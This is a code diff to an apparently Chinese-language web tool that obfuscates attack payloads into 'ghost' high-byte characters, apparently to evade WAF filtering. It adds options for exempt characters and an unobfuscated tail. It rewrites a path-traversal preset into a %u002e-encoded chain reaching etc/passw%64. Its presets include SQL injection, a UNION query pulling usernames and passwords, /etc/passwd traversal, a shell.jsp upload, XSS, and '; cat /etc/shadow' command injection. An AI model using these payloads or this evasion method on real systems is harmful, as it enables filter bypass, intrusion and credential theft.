@@ -599,6 +599,14 @@
         <label>自定义替换字符</label>
         <input type="text" id="customChars" placeholder="如: ';&lt;&gt;=--" style="width:200px;">
       </div>
+      <div class="option-group">
+        <label>豁免字符（不变形）</label>
+        <input type="text" id="exemptChars" placeholder="如: /{}&quot;:." style="width:200px;">
+      </div>
+      <div class="option-group">
+        <label>不混淆的尾部</label>
+        <input type="text" id="plainTail" placeholder="如: etc/passw%64" style="width:220px;">
+      </div>
     </div>
     <div class="checkbox-group" style="margin-top: 8px;">
       <label class="checkbox-item"><input type="checkbox" id="preserveSpace" checked> 保留空格不变</label>
@@ -712,7 +720,7 @@ const PRESETS = {
   sql: `1' OR '1'='1' --`,
   union: `1' UNION SELECT username,password FROM users--`,
   path: `../../../../etc/passwd`,
-  pathArticle: `../../../../../../../etc/passw%64`,
+  pathArticle: `.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/etc/passw%64`,
   upload: `shell.jsp`,
   xss: '<scr' + 'ipt>alert(\'XSS\')</scr' + 'ipt>',
   cmd: `; cat /etc/shadow`,
@@ -809,9 +817,12 @@ function getKeywordTransformIndexes(payload) {
   return indexes;
 }
 
-function shouldTransform(charCode, mode, payload, index) {
+function shouldTransform(charCode, mode, payload, index, plainTailStart) {
   const ch = String.fromCharCode(charCode);
+  const exemptChars = document.getElementById('exemptChars').value;
 
+  if (plainTailStart !== -1 && index >= plainTailStart) return false;
+  if (exemptChars.includes(ch)) return false;
   if (ch === ' ' && document.getElementById('preserveSpace').checked) return false;
   if (ch === '\n' && document.getElementById('preserveNewline').checked) return false;
   if (ch === '\r' && document.getElementById('preserveNewline').checked) return false;
@@ -835,6 +846,7 @@ function shouldTransform(charCode, mode, payload, index) {
 
 function transform() {
   const input = document.getElementById('inputPayload').value;
+  const tail = document.getElementById('plainTail').value;
   if (!input.trim()) {
     showToast('请先输入 Payload');
     return;
@@ -842,6 +854,7 @@ function transform() {
 
   const mode = document.getElementById('mode').value;
   const highByteBase = getHighByte();
+  const plainTailStart = tail && input.endsWith(tail) ? input.length - tail.length : -1;
 
   const mappings = [];
   let transformed = '';
@@ -852,7 +865,7 @@ function transform() {
     const charCode = input.charCodeAt(i);
     totalChars++;
 
-    if (shouldTransform(charCode, mode, input, i)) {
+    if (shouldTransform(charCode, mode, input, i, plainTailStart)) {
       const ghost = toGhostChar(charCode & 0xFF, highByteBase);
       transformed += ghost.char;
       mappings.push({
@@ -1073,6 +1086,8 @@ function filterMapping() {
 
 function setPreset(key) {
   document.getElementById('inputPayload').value = PRESETS[key] || '';
+  document.getElementById('exemptChars').value = key === 'pathArticle' ? '/' : '';
+  document.getElementById('plainTail').value = key === 'pathArticle' ? 'etc/passw%64' : '';
 }
 
 function onModeChange() {
@@ -1159,6 +1174,8 @@ function copyDecodeResult() {
 
 function clearAll() {
   document.getElementById('inputPayload').value = '';
+  document.getElementById('exemptChars').value = '';
+  document.getElementById('plainTail').value = '';
   document.getElementById('outputSection').style.display = 'none';
   document.getElementById('decodeResultSection').style.display = 'none';
   currentTransformResult = null;
